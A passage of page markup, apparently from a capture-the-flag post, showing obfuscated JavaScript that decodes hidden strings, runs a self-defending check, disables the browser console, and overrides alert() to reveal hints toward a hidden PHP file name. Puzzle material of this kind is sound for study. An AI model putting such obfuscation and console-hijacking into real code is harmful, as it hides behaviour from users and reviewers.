class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> _0x32d595<span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>      _0x14c4a4 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> _0x3a58cc<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      _0xddb414 <span class="token operator">=</span> _0x3a1bf6<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> _0x5c1b7b <span class="token operator">=</span> <span class="token function">_0x3587de</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> _0x5c1b7b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">"(((.+)+)+)+$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span>_0x5c1b7b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token string">"(((.+)+)+)+$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_0x5c1b7b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span><span class="token parameter">_0x4dde84<span class="token punctuation">,</span> _0x478812</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _0x29462c <span class="token operator">=</span> <span class="token function">_0x219d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function-variable function">_0x2fa2</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1089fd<span class="token punctuation">,</span> _0x5a8a3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    _0x1089fd <span class="token operator">=</span> _0x1089fd <span class="token operator">-</span> <span class="token number">206</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x32bbf7 <span class="token operator">=</span> _0x29462c<span class="token punctuation">[</span>_0x1089fd<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x2fa2<span class="token punctuation">.</span>MPcALq <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> <span class="token function-variable function">_0x27114c</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x1cfff3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> _0x15567f <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x3c3450 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x3727b6 <span class="token operator">=</span> _0x15567f <span class="token operator">+</span> _0x27114c<span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x5b35e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x305da<span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x2e25de<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> _0x45e1da <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> _0x2e25de <span class="token operator">=</span> _0x1cfff3<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>_0x45e1da<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">~</span>_0x2e25de <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_0x305da <span class="token operator">=</span> _0x5b35e <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">?</span> _0x305da <span class="token operator">*</span> <span class="token number">64</span> <span class="token operator">+</span> _0x2e25de <span class="token operator">:</span> _0x2e25de<span class="token punctuation">,</span> _0x5b35e<span class="token operator">++</span> <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">?</span> _0x15567f <span class="token operator">+=</span> _0x3727b6<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>_0x45e1da <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">?</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">255</span> <span class="token operator">&amp;</span> _0x305da <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span> <span class="token operator">*</span> _0x5b35e <span class="token operator">&amp;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> _0x5b35e <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          _0x2e25de <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>_0x2e25de<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">var</span> _0x3bef59 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> _0x1b19f0 <span class="token operator">=</span> _0x15567f<span class="token punctuation">.</span>length<span class="token punctuation">;</span> _0x3bef59 <span class="token operator">&lt;</span> _0x1b19f0<span class="token punctuation">;</span> _0x3bef59<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          _0x3c3450 <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'00'</span> <span class="token operator">+</span> _0x15567f<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>_0x3bef59<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>_0x3c3450<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      _0x2fa2<span class="token punctuation">.</span>iNUHtA <span class="token operator">=</span> _0x27114c<span class="token punctuation">;</span>      _0x4dde84 <span class="token operator">=</span> arguments<span class="token punctuation">;</span>      _0x2fa2<span class="token punctuation">.</span>MPcALq <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">var</span> _0x1cf422 <span class="token operator">=</span> _0x29462c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0xf7632 <span class="token operator">=</span> _0x1089fd <span class="token operator">+</span> _0x1cf422<span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x5c718f <span class="token operator">=</span> _0x4dde84<span class="token punctuation">[</span>_0xf7632<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>_0x5c718f<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> <span class="token function-variable function">_0x4e8342</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x5bb17b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>vOUKmO <span class="token operator">=</span> _0x5bb17b<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">RgxWRj</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token string">'newState'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lwrkKC <span class="token operator">=</span> <span class="token string">"\\w+ *\\(\\) *{\\w+ *"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>IbivLK <span class="token operator">=</span> <span class="token string">"['|\"].+['|\"];? *}"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token class-name">_0x4e8342</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">wDfUYW</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> _0x47b17d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>lwrkKC <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>IbivLK<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> _0x3d3b23 <span class="token operator">=</span> _0x47b17d<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>RgxWRj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">--</span><span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token operator">--</span><span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">VDwzLi</span><span class="token punctuation">(</span>_0x3d3b23<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token class-name">_0x4e8342</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">VDwzLi</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0xa402ba</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token operator">~</span>_0xa402ba<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> _0xa402ba<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">xwZujq</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>vOUKmO<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token class-name">_0x4e8342</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">xwZujq</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x65f30f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> _0x23db3e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> _0x1e8117 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">.</span>length<span class="token punctuation">;</span> _0x23db3e <span class="token operator">&lt;</span> _0x1e8117<span class="token punctuation">;</span> _0x23db3e<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          _0x1e8117 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">_0x65f30f</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>VyUlWP<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token keyword">new</span> <span class="token class-name">_0x4e8342</span><span class="token punctuation">(</span>_0x2fa2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">wDfUYW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      _0x32bbf7 <span class="token operator">=</span> _0x2fa2<span class="token punctuation">.</span><span class="token function">iNUHtA</span><span class="token punctuation">(</span>_0x32bbf7<span class="token punctuation">)</span><span class="token punctuation">;</span>      _0x4dde84<span class="token punctuation">[</span>_0xf7632<span class="token punctuation">]</span> <span class="token operator">=</span> _0x32bbf7<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      _0x32bbf7 <span class="token operator">=</span> _0x5c718f<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> _0x32bbf7<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x4dde84<span class="token punctuation">,</span> _0x478812<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> <span class="token function-variable function">_0x335615</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _0x3b189a <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">_0x4c04a2<span class="token punctuation">,</span> _0x24bac0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> _0x4a5a98 <span class="token operator">=</span> _0x3b189a <span class="token operator">?</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>_0x24bac0<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> _0x27b3a6 <span class="token operator">=</span> <span class="token function">_0x24bac0</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_0x4c04a2<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>        _0x24bac0 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> _0x27b3a6<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    _0x3b189a <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> _0x4a5a98<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x43b95d</span><span class="token punctuation">(</span><span class="token parameter">_0x16a9da<span class="token punctuation">,</span> _0x24077d<span class="token punctuation">,</span> _0x3b1e2f<span class="token punctuation">,</span> _0x31bd32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x16a9da <span class="token operator">-</span> <span class="token number">0x88</span><span class="token punctuation">,</span> _0x24077d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">_0x219d</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> _0x30f34b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'BgvUz3rO'</span><span class="token punctuation">,</span> <span class="token string">'x19WCM90B19F'</span><span class="token punctuation">,</span> <span class="token string">'yMHwBLK'</span><span class="token punctuation">,</span> <span class="token string">'r0fpB2y'</span><span class="token punctuation">,</span> <span class="token string">'ndq1mdK3vKXQD2Xf'</span><span class="token punctuation">,</span> <span class="token string">'BMn0Aw9UkcKG'</span><span class="token punctuation">,</span> <span class="token string">'qKriuhy'</span><span class="token punctuation">,</span> <span class="token string">'zNnOyNmUCgHW77Ym'</span><span class="token punctuation">,</span> <span class="token string">'sNfnv2u'</span><span class="token punctuation">,</span> <span class="token string">'sNvZDcbWyxj0ia'</span><span class="token punctuation">,</span> <span class="token string">'CMv0DxjUicHMDq'</span><span class="token punctuation">,</span> <span class="token string">'Bg9N'</span><span class="token punctuation">,</span> <span class="token string">'u3zVDMK'</span><span class="token punctuation">,</span> <span class="token string">'Dg9tDhjPBMC'</span><span class="token punctuation">,</span> <span class="token string">'vgHLCMuGAxmGBq'</span><span class="token punctuation">,</span> <span class="token string">'y29UC29Szq'</span><span class="token punctuation">,</span> <span class="token string">'mtq4mduYrhfgDePg'</span><span class="token punctuation">,</span> <span class="token string">'BeXZrMi'</span><span class="token punctuation">,</span> <span class="token string">'CMr6AwG'</span><span class="token punctuation">,</span> <span class="token string">'Ce1LCLO'</span><span class="token punctuation">,</span> <span class="token string">'mtqXmJaYmJbQrxjKtvi'</span><span class="token punctuation">,</span> <span class="token string">'y29UC3rYDwn0BW'</span><span class="token punctuation">,</span> <span class="token string">'mM9nEvvdtW'</span><span class="token punctuation">,</span> <span class="token string">'t2HSvg4'</span><span class="token punctuation">,</span> <span class="token string">'yMLUza'</span><span class="token punctuation">,</span> <span class="token string">'t1PSvLu'</span><span class="token punctuation">,</span> <span class="token string">'DhjHy2u'</span><span class="token punctuation">,</span> <span class="token string">'zxHJzxb0Aw9U'</span><span class="token punctuation">,</span> <span class="token string">'ChjVDg90ExbL'</span><span class="token punctuation">,</span> <span class="token string">'yxbWBhK'</span><span class="token punctuation">,</span> <span class="token string">'CLLSzKW'</span><span class="token punctuation">,</span> <span class="token string">'qM1dzLO'</span><span class="token punctuation">,</span> <span class="token string">'C2vHCMnO'</span><span class="token punctuation">,</span> <span class="token string">'sgTmCuS'</span><span class="token punctuation">,</span> <span class="token string">'wLPXD0y'</span><span class="token punctuation">,</span> <span class="token string">'BuDvAve'</span><span class="token punctuation">,</span> <span class="token string">'B3jLihrVignVBq'</span><span class="token punctuation">,</span> <span class="token string">'wgjrufO'</span><span class="token punctuation">,</span> <span class="token string">'qNzWyvK'</span><span class="token punctuation">,</span> <span class="token string">'DgfIBgu'</span><span class="token punctuation">,</span> <span class="token string">'rNjVr1a'</span><span class="token punctuation">,</span> <span class="token string">'rxH0Bwy'</span><span class="token punctuation">,</span> <span class="token string">'zMnKt0u'</span><span class="token punctuation">,</span> <span class="token string">'Dg9NzxrOzxi'</span><span class="token punctuation">,</span> <span class="token string">'DxHZruG'</span><span class="token punctuation">,</span> <span class="token string">'C0D1wvO'</span><span class="token punctuation">,</span> <span class="token string">'rwfHEK0'</span><span class="token punctuation">,</span> <span class="token string">'mtHwzwnYDvu'</span><span class="token punctuation">,</span> <span class="token string">'v0fUDfi'</span><span class="token punctuation">,</span> <span class="token string">'mtjowMn0uw4'</span><span class="token punctuation">,</span> <span class="token string">'mtu4mfnrCuLsuq'</span><span class="token punctuation">,</span> <span class="token string">'mZu5odf6wfHwA3q'</span><span class="token punctuation">,</span> <span class="token string">'y3rVCIGICMv0Dq'</span><span class="token punctuation">,</span> <span class="token string">'sgzKDhe'</span><span class="token punctuation">,</span> <span class="token string">'u3rPDgnOigL0ia'</span><span class="token punctuation">,</span> <span class="token string">'sNzcDgS'</span><span class="token punctuation">,</span> <span class="token string">'yvjIzxm'</span><span class="token punctuation">,</span> <span class="token string">'uwn3ALG'</span><span class="token punctuation">,</span> <span class="token string">'zxjYB3i'</span><span class="token punctuation">,</span> <span class="token string">'EKjJqLm'</span><span class="token punctuation">,</span> <span class="token string">'mJa3mtuXuMLZrvzf'</span><span class="token punctuation">,</span> <span class="token string">'mNWZFdb8mxW1Fa'</span><span class="token punctuation">,</span> <span class="token string">'kcGOlISPkYKRkq'</span><span class="token punctuation">,</span> <span class="token string">'ota4oe1Jtwz3Ba'</span><span class="token punctuation">,</span> <span class="token string">'mJa3meXSzg9OuG'</span><span class="token punctuation">,</span> <span class="token string">'ywXLCNq'</span><span class="token punctuation">,</span> <span class="token string">'ntq2mtq1D2r3rhP4'</span><span class="token punctuation">,</span> <span class="token string">'AwLfBMO'</span><span class="token punctuation">,</span> <span class="token string">'rM1vuuu'</span><span class="token punctuation">,</span> <span class="token string">'zLf1DKW'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function-variable function">_0x219d</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> _0x30f34b<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">_0x219d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> _0xfb81ef <span class="token operator">=</span> <span class="token function">_0x335615</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> <span class="token function-variable function">_0x23eea3</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> _0x171219<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      _0x171219 <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">"return (function() {}.constructor(\"return this\")( ));"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x421704<span class="token punctuation">)</span> <span class="token punctuation">{</span>      _0x171219 <span class="token operator">=</span> window<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> _0x171219<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> _0x1b449f <span class="token operator">=</span> <span class="token function">_0x23eea3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> _0xf883ee <span class="token operator">=</span> _0x1b449f<span class="token punctuation">.</span>console <span class="token operator">=</span> _0x1b449f<span class="token punctuation">.</span>console <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> _0x53109c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">,</span> <span class="token string">'warn'</span><span class="token punctuation">,</span> <span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"exception"</span><span class="token punctuation">,</span> <span class="token string">"table"</span><span class="token punctuation">,</span> <span class="token string">"trace"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> _0x52328e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> _0x52328e <span class="token operator">&lt;</span> _0x53109c<span class="token punctuation">.</span>length<span class="token punctuation">;</span> _0x52328e<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> _0x2e72f3 <span class="token operator">=</span> <span class="token class-name">_0x335615</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">prototype</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0x335615<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x2327c2 <span class="token operator">=</span> _0x53109c<span class="token punctuation">[</span>_0x52328e<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _0x5b572d <span class="token operator">=</span> _0xf883ee<span class="token punctuation">[</span>_0x2327c2<span class="token punctuation">]</span> <span class="token operator">||</span> _0x2e72f3<span class="token punctuation">;</span>    _0x2e72f3<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token function">_0x335615</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0x335615<span class="token punctuation">)</span><span class="token punctuation">;</span>    _0x2e72f3<span class="token punctuation">.</span>toString <span class="token operator">=</span> _0x5b572d<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>_0x5b572d<span class="token punctuation">)</span><span class="token punctuation">;</span>    _0xf883ee<span class="token punctuation">[</span>_0x2327c2<span class="token punctuation">]</span> <span class="token operator">=</span> _0x2e72f3<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">_0xfb81ef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"There is more to come"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"rqxvweqty，Just part of it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"fshbs.php，Stitch it together"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(stitch it:缝;缝合;缝补)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">confirm</span><span class="token punctuation">(</span>xxxxxxx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><spa